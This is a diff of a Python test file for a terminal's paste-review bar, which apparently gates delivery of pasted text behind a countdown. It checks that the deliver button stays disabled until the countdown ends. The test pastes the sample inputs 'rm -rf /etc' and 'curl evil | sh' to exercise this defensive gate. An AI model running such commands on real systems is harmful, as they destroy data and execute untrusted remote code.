@@ -3321,17 +3321,16 @@ ok(not _rbt.review_pending(), 'the real Reject click dispatched the reject')
 ok(not _rbar.isVisible() and _rbar.reviewed_term() is None,
    'the bar HIDES after a real button click (regression: the guard left it open)')
 
-# countdown: buttons stay ENABLED (focusable) so focus previews; a delivery CLICK is gated
+# countdown: after a mode radio is picked, the deliver button is DISABLED (gated) until
+# the countdown elapses; picking a mode previews its delivered form in the mirror.
 _rbt.apply_paste_delay(3)
 _rbm2 = _QMimeRB(); _rbm2.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm2); pump()
-ok(_rbar._stripped.isEnabled() and _rbar._gated,
-   'a Paste button stays ENABLED during the countdown (gate up)')
-_rbar._stripped.setFocus(); pump()
-ok(_rbar._stripped.hasFocus() and _rbar._preview_action == 'stripped',
-   'focusing a Paste button during the countdown PREVIEWS its delivered form (regression)')
-_rbar._stripped.click(); pump()
+_rbar._radio_strip.click(); pump()
+ok(not _rbar._deliver.isEnabled() and _rbar._selected_action == 'stripped',
+   'picking a mode during the countdown previews it but leaves deliver DISABLED (gated)')
+_rbar._deliver_clicked(); pump()
 ok(_rbt.review_pending() and _rbar.isVisible(),
-   'clicking a delivery button during the countdown is a gated no-op (still reviewing)')
+   'a deliver click during the countdown is a gated no-op (still reviewing)')
 _rbar._reject.click(); pump()
 _rbwin.close()
 
